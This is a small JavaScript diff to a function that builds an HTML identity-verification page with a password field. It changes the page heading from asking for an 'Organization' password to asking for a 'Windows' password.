@@ -411,7 +411,7 @@ function verifyHtml(message, username) {
     '}' +
     '</style></head><body>' +
     '<div class="pad">' +
-    '<h1>Enter your Organization password to prove your identity</h1>' +
+    '<h1>Enter your Windows password to prove your identity</h1>' +
     '<p class="msg" id="msg"></p>' +
     '<div class="lbl" id="lbl"></div>' +
     '<input id="pw" type="password" placeholder="Password" autocomplete="current-password" autofocus />' +
